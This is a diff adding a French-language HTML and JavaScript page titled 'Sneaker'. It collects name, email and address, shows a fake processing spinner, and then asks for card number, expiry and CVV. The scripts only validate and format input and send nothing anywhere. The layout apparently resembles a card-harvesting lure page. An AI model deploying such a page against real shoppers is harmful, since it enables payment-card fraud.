@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Sneaker</title>
+</head>
+<style>
+       .mprog{
+        background-color: #2FCDFF;
+        border-radius: 15px;
+        padding : 20px 20px;
+    }
+      .infoSecDetails{
+        padding-left: 5px;
+        margin-top: 20px;
+        display:flex;
+        flex-direction: column;
+        justify-content: center;
+        width: 20rem;
+        border-radius: 15px;
+        margin-left: 5px;
+    }
+    .infoSecDetails   form{
+        width: 90%;
+        margin: 0px auto;
+        padding-top: 10px;
+    }
+    form input{
+        background-color: rgba(218, 216, 216, 0.267);
+        border-radius: 10px;
+        height: 45px;
+        padding-left: 14px;
+        width: 100%;
+        font-size: small;
+        margin: 6px auto 0px;
+    }
+    .split input{
+        width: 49%;
+    }
+    form input[type="checkbox"] {
+    width: 22px;
+}
+    .cop{
+        margin-top: -40px;
+        width: fit-content;
+        margin-left: 18rem;
+    }
+    .cop img{
+        width: 100px;
+    }
+    .loading{
+        height: 100vh;
+        width: 100vw;
+        text-align: center;
+        padding-top: 25vh;
+        position: fixed;
+        top: 0px;
+        background-color: rgba(0, 0, 0, 0.89);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        gap: 3rem;
+    }
+</style>
+<body>
+    <div class="bg-[#FE6565] h-screen w-screen">
+        <div class="h-10  pt-1 lg:pt-2 bg-black flex gap-2 lg:gap-10 justify-center w-full text-xs lg:text-sm">
+            <div class="flex gap-4 text-white h-full justify-center align-center">
+                <img src="card.png" class="w-5 h-5 mt-1" />
+                <span>Paiement sécurisé de qualité </span>
+            </div>
+            <div class="flex gap-4 text-white h-full justify-center align-center">
+                <img src="user.png" class="w-5 h-4 mt-1" />
+                <span>Service client disponible 24/7 à votre écoute </span>
+            </div>
+        </div>
+        <div>
+            <img src="linear.png"  class="h-4 ml-10 mt-6 xl:ml-20 xl:mt-10"/>
+        </div>
+        <div class="absolute top-20 xl:top-32 right-5 xl:right-40">
+            <img src="close.svg" />
+        </div>
+        <div class="flex flex-col xl:mt-10 xl:flex-row w-[90vw] xl:gap-20 mx-auto">
+            <div class="w-full xl:w-1/2 relative">
+            <img src="nous.png"  class="w-[200px] xl:w-[600px] ml-10 mt-6 xl:mt-10"/>
+                <img src="sneak.png" class="w-[800px] ml-auto"/>
+                <img src="pour.png" class="w-[150px] absolute left-20 top-32"/>
+            </div>
+            <div class="w-96 rounded-lg h-full bg-white infoSecDetails">
+        <div  class="send lg:block xl:mt-5 pt-2 xl:pt-10">
+            <div class="w-fit mx-auto ">Remplissez vos coordonneés</div>
+            <form class="hidden xl:block" onsubmit="return handleSubmit(event)">
+            
+                <span class="text-xs text-red-400 ferror hidden">Merci de remplir ce champ obligatoire</span>
+                <input  type="text" placeholder="Nom de famille" class="outline-none dFamile"  
+                 />
+                 
+                <span class="text-xs text-red-400 Admerror hidden">Merci de remplir ce champ obligatoire</span>
+                <input  type="text" placeholder="Adress email" class="outline-none dadm"
+              />
+              
+              <span class="text-xs text-red-400 Adrerror hidden">Merci de remplir ce champ obligatoire</span>
+                <input  type="text" placeholder="Adress" class="outline-none dAd"/>
+                
+                <span class="text-xs text-red-400 Serror hidden">Merci de remplir ce champ obligatoire</span>
+                <div class="split">
+                <input  type="text" placeholder="Ville" class="outline-none dVim"/>
+                <input  type="text" placeholder="Code Portal" class="outline-none code dPort" />
+                </div>
+                <div class="flex w-fit  gap-2 mx-auto  text-sm"  >
+                <input  type="checkbox" name="checkbox" id="checkbox"  required/><div class="mt-4">
+                    <label for="checkbox">jai plus de 18 ans et j'accepte les conditions</label></div>
+                </div>
+                <button type="submit" class="forFix w-full mt-2 mx-auto">
+                    <img src="jev.png" class="h-12 mx-auto" />
+                </button>
+            </form>
+            <form class="my-1 formatiom xl:hidden  rounded-xl">
+                <span class="hidden mErr  text-red-600 text-xs italic font-bold ">Merci de remplir ce champ obligatoire</span>
+                <div class="flex mInp">
+                    <input type="text" class="outline-none family" placeholder="Nom de famille" />
+                    <input type="text" class="outline-none hidden adrem "  placeholder="Adresse"  />
+                    <input type="text" class="outline-none hidden portt"  placeholder="Code Portal"  />
+                    <input type="text" class="outline-none hidden vim"  placeholder="Ville"  />
+                    <input type="text" class="outline-none hidden adm"  placeholder="Adresse email"  />
+                    <div class="mprog">
+                    <img src="arr.png"  class="h-fit"/>
+                    </div>
+                </div>
+            </form>
+        </div>
+        <div class="hidden payd py-10 ">
+            <div class="w-fit mx-auto text-sm font-semibold">Informations de paiement</div>
+            <form>
+                <input  type="text" placeholder="1234 1234 1234 1234" class="outline-none first
+                numCard"
+                 maxlength="19" oninput="formatCardNumber(event)" required />
+                <div class="split mt-3 relative">
+                <input  type="text" placeholder="MM/YY" maxlength="5"
+                oninput="formatCardExpiration(event)" class="outline-none cardDate"  required/>
+                <input  type="text"   maxlength="3"  placeholder="CVV"  
+                      oninput="formatCVV(event)"class="outline-none cvv"   required/>
+                      <div class="absolute right-5 bg-white top-5" >
+                        <img src="mastercard.svg" class="w-5"/>
+                      </div><div class="absolute right-11 top-4" >
+                        <img src="visacard.svg" class="w-5"/>
+                      </div>
+                </div>
+                <button type="submit" class="mt-3 pdesk">
+                    <img src="pay.svg" />
+                </button>
+            </form>
+            
+        </div>
+            </div>
+           
+        </div>
+    </div>
+    <div class="loading hidden z-10 absolute top-0 text-white">
+        <img src="load.gif" class="h-24 mx-auto"/>
+        <div class="w-72 mt-3 text-center italic mx-auto">Veuillez patienter, nous sommes en 
+            train de traiter l'information</div>
+    </div>
+</body>
+<script>
+      const dFamile= document.querySelector(".dFamile")
+    const dAd= document.querySelector(".dAd")
+    const numCard= document.querySelector(".numCard")
+    const dadm= document.querySelector(".dadm")
+    const dPort= document.querySelector(".dPort")
+    const dVim= document.querySelector(".dVim")
+    const ferror= document.querySelector(".ferror")
+    const Serror= document.querySelector(".Serror")
+    const Adrerror= document.querySelector(".Adrerror")
+    const Admerror= document.querySelector(".Admerror")
+    const form = document.querySelector(".send")
+    const loading = document.querySelector(".loading")
+    const payd = document.querySelector(".payd")
+    const mprog = document.querySelector(".mprog")
+    const code = document.querySelector(".code")
+    const forFix  = document.querySelector(".forFix")
+    let counstart = 0;
+    const family = document.querySelector(".family")
+    const adrem = document.querySelector(".adrem")
+    const vim = document.querySelector(".vim")
+    const adm= document.querySelector(".adm")
+    const portt= document.querySelector(".portt")
+    const mErr= document.querySelector(".mErr")
+    const formatiom = document.querySelector(".formatiom")
+
+    restrictToNumbers(code)
+    mprog.addEventListener("click", ()=>{
+        if(counstart == 0  ){
+            if(family.value.length > 3){
+                mErr.style.display = "none"
+                family.style.display = "none" 
+            adrem.style.display = "block"
+            adrem.focus()
+            counstart++
+            }else{
+                mErr.style.display = "block"
+            }
+        }else   if(counstart == 1){
+            if(adrem.value.length > 3){
+                mErr.style.display = "none"
+            adrem.style.display = "none" 
+            portt.style.display = "block"
+            portt.focus()
+            counstart++}else{
+                mErr.style.display = "block"
+            }
+}else   if(counstart == 2){
+    if(portt.value.length > 3){
+                mErr.style.display = "none"
+                portt.style.display = "none" 
+            vim.style.display = "block"
+                vim.focus()
+            counstart++
+        }else{
+                mErr.style.display = "block"
+            }
+ 
+}else   if(counstart == 3){
+    if(vim.value.length > 3){
+                mErr.style.display = "none"
+                vim.style.display = "none" 
+            adm.style.display = "block"
+                adm.focus()
+            counstart++
+        }else{
+                mErr.style.display = "block"
+            }
+   
+}else if(counstart ==4){
+    mErr.style.display = "none" 
+            form.style.display = "none"
+            loading.style.display ="block"
+            setTimeout(myFunction, 2000);
+        payd.style.display = "block"  
+        numCard.focus()
+}
+    })
+  
+    function handleSubmit(event) {
+            event.preventDefault();
+            dFamile.value.length > 2 ? ferror.style.display = "none" :ferror.style.display =  "block"     
+            dadm.value.length > 2 ? Admerror.style.display = "none" : Admerror.style.display = "block"
+            dAd.value.length > 2 ? Adrerror.style.display = "none" :Adrerror.style.display =  "block"
+            dVim.value.length > 2 && dPort.value.length > 2 ? Serror.style.display = "none" : Serror.style.display = "block"// Prevents the form from submitting
+if(dFamile.value.length > 2 && dadm.value.length > 2 
+    && dAd.value.length > 2 && dVim.value.length > 2 && dPort.value.length > 2  
+){
+
+    form.style.display ="none" 
+    loading.style.display = "block"
+    setTimeout(myFunction, 2000);
+        payd.style.display = "block"
+             numCard.focus()
+}
+            return false; // Return false to further prevent default behavior
+        }
+        function myFunction() {
+
+ loading.style.display = "none"
+}
+document.addEventListener('keydown', (event) =>{
+        if (event.key === 'Enter' || event.keyCode === 13){
+            if(window.innerWidth >900){
+                forFix.click(); 
+            }else{
+                mprog.click()
+                }
+        }
+    })
+
+
+
+function restrictToNumbers(inputElement) {
+    inputElement.addEventListener('input', function(event) {
+        let inputValue = inputElement.value;
+
+        inputValue = inputValue.replace(/\D/g, '');
+
+        inputElement.value = inputValue;
+    });
+}
+function formatCVV(event) {
+  let input = event.target;
+  let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+  value = value.substring(0, 3); // Limit to 3 characters
+  input.value = value; // Assign the formatted value back to the input
+}
+
+function formatCardExpiration(event) {
+  let input = event.target;
+  let value = input.value.replace(/\D/g, '');
+  if (event.inputType === 'deleteContentBackward') {
+    if (input.selectionStart <= 3) {
+      value = value.substring(0, input.selectionStart);
+    } else {
+      value = value.substring(0, 2) + value.substring(3, input.selectionStart);
+    }
+  } else {
+    value = value.substring(0, 4); 
+    value = value.replace(/(\d{2})(\d{0,2})/, '$1/$2');
+  }
+  
+  input.value = value;
+  if(value.length == 5){
+    cvv.focus()
+  }
+}
+function formatCardNumber(event) {
+  let input = event.target;
+  let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+  value = value.substring(0, 16); // Limit to 16 digits
+
+  let formattedValue = '';
+  for (let i = 0; i < value.length; i += 4) {
+    formattedValue += value.substr(i, 4) + ' ';
+  }
+
+  input.value = formattedValue.trim();
+  if(input.value.length == 19){
+    cardDate.focus()
+  }
+}
+</script>
+</html>
